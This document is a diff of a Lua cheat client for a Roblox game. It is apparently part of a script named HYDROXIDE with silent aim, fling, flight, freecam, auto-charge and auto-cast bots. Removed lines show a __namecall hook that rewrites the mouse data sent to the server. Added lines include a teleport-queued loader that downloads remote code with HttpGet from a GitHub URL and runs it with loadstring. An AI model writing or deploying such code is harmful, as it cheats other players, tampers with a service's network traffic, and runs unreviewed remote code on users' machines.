                 if cheat_client.feature_connections.silent_aim then
                     cheat_client.feature_connections.silent_aim:Disconnect()
                     cheat_client.feature_connections.silent_aim = nil
-                end
-                
-                -- Cleanup aimbot data
-                if cheat_client.aimbot then
-                    cheat_client.aimbot.silent_instance = nil
-                    cheat_client.aimbot.silent_position = nil
+
+                    cheat_client.aimbot.silent_vector = nil
                     cheat_client.aimbot.current_target = nil
-                end
-                
-                -- Hide FOV circle
-                if aimbot_fov_circle then
+                    cheat_client.aimbot.current_target_part = nil
                     aimbot_fov_circle.Visible = false
-                end
-                
-                -- CRITICAL: Unhook the namecall
-                if cheat_client.silent_aim_hook and cheat_client.silent_aim_original_namecall then
-                    pcall(function()
-                        hookmetamethod(game, "__namecall", cheat_client.silent_aim_original_namecall)
-                    end)
-                    cheat_client.silent_aim_hook = nil
-                    cheat_client.silent_aim_original_namecall = nil
+                    silent_circle.Visible = false
                 end
             end
-
-            -- Store the original namecall BEFORE hooking
-            cheat_client.silent_aim_original_namecall = hookmetamethod(game, "__namecall", function(self, ...)
-                local method = getnamecallmethod()
-                local args = {...}
-                
-                if method == "FireServer" and self.Name == "Network" then
-                    local cmd = args[1]
-                    local data = args[2]
-                    
-                    if type(cmd) == "string" and cmd == "Click" and type(data) == "table" then
-                        -- Add safety checks to prevent errors when unloaded
-                        local safe_to_modify = pcall(function()
-                            return Toggles and Toggles.SilentAim and Toggles.SilentAim.Value 
-                                and cheat_client and cheat_client.aimbot
-                        end)
-                        
-                        if safe_to_modify then
-                            local tool = data.Tool
-                            
-                            if tool and valid_tools[tool.Name] then
-                                if cheat_client.aimbot.current_target 
-                                and cheat_client.aimbot.silent_instance 
-                                and cheat_client.aimbot.silent_position then
-                                    
-                                    if data.ClientData and data.ClientData.Mouse then
-                                        local pos = cheat_client.aimbot.silent_position
-                                        
-                                        data.ClientData.Mouse = {
-                                            ["Instance"] = cheat_client.aimbot.silent_instance,
-                                            ["Position"] = pos
-                                        }
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-                
-                return cheat_client.silent_aim_original_namecall(self, ...)
-            end)
-            
-            -- Mark that hook is active
-            cheat_client.silent_aim_hook = true
 
             cheat_client.start_silent_aim_rendering = start_silent_aim_rendering
             cheat_client.stop_silent_aim_rendering = stop_silent_aim_rendering
@@ -13854,7 +26938,7 @@ if game.PlaceId == 100010170789226 then
             end
         end
 
-        do -- Better Flight
+        do
             local direction = Vector3.new()
             local interpolated_dir = direction
             local tilt = 0
@@ -13997,7 +27081,7 @@ if game.PlaceId == 100010170789226 then
             cheat_client.stop_better_flight = stop_better_flight
         end
 
-        do -- Fling
+        do
             local flingEnabled = false
             local Y_VELOCITY = 9e9
             local death_connection
@@ -14157,7 +27241,6 @@ if game.PlaceId == 100010170789226 then
                             part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                             part.Velocity = Vector3.new(0, 0, 0)
 
-                            -- Restore collision
                             if part.Name ~= "HumanoidRootPart" then
                                 if part.Name == "Head" or part.Name == "Torso" then
                                     part.CanCollide = true
@@ -14183,7 +27266,7 @@ if game.PlaceId == 100010170789226 then
             cheat_client.stop_fling = stop_fling
         end
 
-        do -- freecam
+        do
             local empty_vector = Vector3.new(0, 0, 0)
     
             local move_position = Vector2.new(0, 0)
@@ -14350,13 +27433,12 @@ if game.PlaceId == 100010170789226 then
                 end
             end
 
-            -- Hook to freecam toggle OnChanged (will be called after toggle setup)
             cheat_client.start_freecam_rendering = start_freecam_rendering
             cheat_client.stop_freecam_rendering = stop_freecam_rendering
         end
 
 
-        do -- Execute on Serverhop Handler
+        do
             local teleport_debounce = false
 
             utility:Connection(plr.OnTeleport, function(State)
@@ -14370,16 +27452,178 @@ if game.PlaceId == 100010170789226 then
                     if queue_func then
                         local success, err = pcall(function()
                             local loader_script
-                            if readfile and isfile and isfile("bazaar_loader.txt") and not (getgenv and getgenv().HYDROXIDE_REPO) then
-                                loader_script = [[local s,e=pcall(loadstring(readfile("bazaar_loader.txt")))if not s and getgenv and getgenv().HYDROXIDE_DEBUG then print("[QUEUE ERROR]",e)end]]
+                            if readfile and isfile and isfile("bazaar_loader.lua") then
+                                loader_script = [[local code=readfile("bazaar_loader.lua") local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Code preview:",code:sub(1,200)) return end local s,runErr=pcall(fn) if not s then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
                             else
-                                loader_script = get_queued_loader_script()
+                                loader_script = [[if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1) local s,code=pcall(function() return game:HttpGet("https://raw.githubusercontent.com/heisenburgah/HYDROXIDE/refs/heads/main/loader.lua") end) if not s then print("[QUEUE ERROR] HttpGet failed:",code) return end local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
                             end
                             queue_func(loader_script)
                         end)
                     end
                 end
             end)
+        end
+    
+        do
+            local stats = Services.Stats
+            local pingStat = WaitForChild(stats, "PerformanceStats"):WaitForChild("Ping")
+            local smoothed_ping = 0
+
+            task.spawn(function()
+                while shared and not shared.is_unloading do
+                    local raw = pingStat and pingStat:GetValue() or 0
+                    smoothed_ping = math.clamp((smoothed_ping * 0.3) + (raw * 0.7), 0, 300)
+                    task.wait(0.25)
+                end
+            end)
+
+            local function adjusted_wait(base, mult)
+                mult = mult or 1
+                task.wait(base + (math.min(smoothed_ping, 150) / 2000) * mult)
+            end
+
+            local function apply_auto_charge(character)
+                local mana = WaitForChild(character, "Mana")
+                local cached_tool = nil
+
+                task.spawn(function()
+                    while shared and not shared.is_unloading do
+                        if Toggles.SnapTrain and Toggles.SnapTrain.Value then
+                            task.wait(0.01)
+                        else
+                            if not utility then break end
+                            task.wait(utility:random_wait(true))
+                        end
+
+                        if not plr.Character or plr.Character ~= character or not utility or not Toggles or not Options then
+                            break
+                        end
+
+                        local char = plr.Character
+                        local mana_val = mana.Value
+
+                        if Toggles.SnapTrain and Toggles.SnapTrain.Value and utility then
+                            if Toggles.AutoCharge and Toggles.AutoCharge.Value then
+                                Toggles.AutoCharge:SetValue(false)
+                            end
+
+                            local tool = FindFirstChildOfClass(char, "Tool")
+                            if tool and FindFirstChild(tool, "Spell") and not cached_tool then
+                                cached_tool = tool
+                            end
+
+                            if cached_tool and cheat_client.spell_cost[cached_tool.Name] then
+                                local spell_data = cheat_client.spell_cost[cached_tool.Name][1]
+                                local min_cost, max_cost = spell_data[1], spell_data[2]
+                                local mid_cost = (min_cost + max_cost) / 2
+                                local range = max_cost - min_cost
+                                
+                                local buffer = math.min(3, math.floor(range / 3))
+                                if buffer < 1 then buffer = 0 end
+
+                                if mana_val < (mid_cost - 1) then
+                                    utility:charge_mana_until(mid_cost)
+                                end
+
+                                if mana_val >= (min_cost + buffer)
+                                    and mana_val <= (max_cost - buffer)
+                                    and not cs:HasTag(char, "Casting")
+                                then
+                                    if FindFirstChildOfClass(char, "Tool") ~= cached_tool then
+                                        if cached_tool.Parent == plr.Backpack then
+                                            char.Humanoid:EquipTool(cached_tool)
+                                            adjusted_wait(0.01)
+                                        end
+                                    end
+
+                                    if utility then
+                                        utility:LeftClick()
+                                    end
+
+                                    local timeout = 0
+                                    repeat
+                                        task.wait(0.005)
+                                        timeout = timeout + 1
+                                    until cs:HasTag(char, "Casting") or not utility or timeout > 20
+
+                                    if cs:HasTag(char, "Casting") then
+                                        char.Humanoid:UnequipTools()
+                                        
+                                        timeout = 0
+                                        repeat 
+                                            task.wait(0.01)
+                                            timeout = timeout + 1
+                                        until not cs:HasTag(char, "Casting") or not utility or timeout > 100
+                                        
+                                        if not utility then return end
+                                        task.wait(utility:random_wait(true))
+
+                                        if cached_tool.Parent == plr.Backpack then
+                                            char.Humanoid:EquipTool(cached_tool)
+                                        end
+                                    end
+                                end
+                            end
+                        else
+                            cached_tool = nil
+                        end
+
+                        if Toggles.AutoCharge and Toggles.AutoCharge.Value
+                            and mana_remote
+                            and mana_val < Options.AutoChargeThreshold.Value
+                            and not cs:HasTag(char, "Casting")
+                            and not (trinket_bot and trinket_bot.path_running)
+                        then
+                            if Toggles.train_climb and Toggles.train_climb.Value then
+                                Toggles.train_climb:SetValue(false)
+                            end
+
+                            utility:charge_mana_until(Options.AutoChargeThreshold.Value)
+                        end
+
+                        if Toggles.train_climb and Toggles.train_climb.Value then
+                            if Toggles.AutoCharge and Toggles.AutoCharge.Value then
+                                Toggles.AutoCharge:SetValue(false)
+                            end
+
+                            utility:charge_mana_until(100)
+                            repeat
+                                vim:SendKeyEvent(true, "Space", false, game)
+                                adjusted_wait(0.05)
+                                vim:SendKeyEvent(false, "Space", false, game)
+                                adjusted_wait(0.05)
+                            until mana.Value == 0 or not Toggles.train_climb.Value
+                        end
+                    end
+                end)
+            end
+
+            local character = plr.Character or plr.CharacterAdded:Wait()
+            apply_auto_charge(character)
+            utility:Connection(plr.CharacterAdded, apply_auto_charge)
+        end
+
+
+        do
+            while shared and not shared.is_unloading and task.wait(0.6) do
+                if plr.Backpack and plr.Character and not cs:HasTag(plr.Character, "Danger") and shared and Toggles and Toggles.loop_orderly and Toggles.loop_orderly.Value then
+                    local elixir = FindFirstChild(plr.Backpack, "Tespian Elixir")
+                    if elixir then
+                        plr.Character.Humanoid:EquipTool(elixir)
+                        task.wait(0.1)
+        
+                        local equippedElixir = FindFirstChild(plr.Character, "Tespian Elixir")
+                        if equippedElixir and FindFirstChild(equippedElixir, "RemoteEvent") then
+                            equippedElixir.RemoteEvent:FireServer(plr.Character.HumanoidRootPart.CFrame, "Part", "Self")
+                            task.wait(1.5)
+                            plr.Character:BreakJoints()
+                            
+                            repeat task.wait(0.5)
+                            until FindFirstChild(plr.Character, "Immortal")
+                        end
+                    end
+                end
+            end
         end
     end
     end, function(err)
@@ -14390,18 +27634,6 @@ if game.PlaceId == 100010170789226 then
         if key then
             getgenv()[key] = nil
         end
-        if getgenv then
-            getgenv().HYDROXIDE_LAST_ERROR = tostring(err)
-        end
-        set_hydroxide_load_stage("battlegrounds_source_error", err)
-        load_warn("[HYDROXIDE] Script error:", err)
-        error(err)
-    else
-        set_hydroxide_load_stage("battlegrounds_source_ready")
+        warn("[hydroxide.sol] Script error:", err)
     end
-else
-    fatal_load(
-        "battlegrounds_unsupported_place",
-        string.format("[HYDROXIDE] Unsupported Battlegrounds place/game (PlaceId=%s GameId=%s).", tostring(game.PlaceId), tostring(game.GameId))
-    )
 end
